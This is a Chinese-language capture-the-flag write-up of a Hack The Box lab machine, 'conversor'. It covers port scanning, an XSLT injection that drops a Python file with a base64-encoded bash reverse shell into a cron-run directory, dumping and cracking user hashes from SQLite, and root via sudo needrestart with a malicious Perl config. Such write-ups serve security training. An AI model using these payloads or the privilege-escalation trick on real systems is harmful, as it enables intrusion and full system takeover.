
# 信息收集
```
nmap --min-rate 10000 -p- 10.129.18.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 14:21 CST
Nmap scan report for 10.129.18.151 (10.129.18.151)
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.66 seconds


nmap -sU --top-ports 20 10.129.18.151
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 14:22 CST
Nmap scan report for 10.129.18.151 (10.129.18.151)
Host is up (0.11s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds

```
只开放了22 80

# Web
```
curl http://10.129.18.151/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://conversor.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.129.18.151 Port 80</address>
</body></html>
```
可以看到需要配置hosts域名
```
curl http://10.129.18.151/ -L
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<main id="app-main">
<div class="elegant-card">
<h2>Login</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required style="margin-bottom:1rem;width:100%;padding:0.6rem;border-radius:8px;border:1px solid #ccc;">
<input type="password" name="password" placeholder="Password" required style="margin-bottom:1rem;width:100%;padding:0.6rem;border-radius:8px;border:1px solid #ccc;">
<button class="btn">Login</button>
<p style="margin-top:1rem;">Don't have an account? <a href="/register">Register</a></p>

</form>
</div>
</main>
</body>
</html>
```
跟随重定向发现是个登录页面,注册账户登录上去发现可以上传xml和xslt文件，在about路由下发现源码

在install.md可以发现
```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```
每分钟执行这个目录下的py文件，所以利用xslt写入py文件反弹shell


xslt注入 payload,xml随便传
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os;os.system("printf YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMS8yMzMyIDA+JjEK |base64 -d |bash")
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>

```

等一分钟拿到反弹shell

# 提权

```
www-data@conversor:~/conversor.htb/instance$ file users.db
file users.db
users.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 18, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 18

www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
sqlite3 users.db
.tables
files  users
select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|admin|21232f297a57a5a743894a0e4a801fc3
```
可以读到hash，解密时`Keepmesafeandwarm`

拿到fismathack用户
```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
fismathack@conversor:~$
```
sudo 权限可以执行needrestart，

```
fismathack@conversor:~$ needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7
[main] running in user mode
[Core] Using UI 'NeedRestart::UI::stdio'...
[main] systemd detected
[main] vm detected
[main] inside container or vm, skipping microcode checks
fismathack@conversor:~$
```
这个版本有几个cve但是要求sudo不能清除环境变量也是就是`!env_reset`，显然不具备利用条件，不过needrestart的特性时-c参数指定的文件会被当做perl文件运行，所以写入恶意配置即可
```
fismathack@conversor:~$ echo 'system("chmod +s /bin/bash");' > exp
fismathack@conversor:~$ chmod +x exp
fismathack@conversor:~$ cat exp
system("chmod +s /bin/bash");
fismathack@conversor:~$ sudo needrestart -c exp
Scanning processes...
Scanning linux images...

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on
 this host.
fismathack@conversor:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
fismathack@conversor:~$ bash -p
bash-5.1# id
uid=1000(fismathack) gid=1000(fismathack) euid=0(root) egid=0(root) groups=0(root),1000(fismathack)
bash-5.1#
```


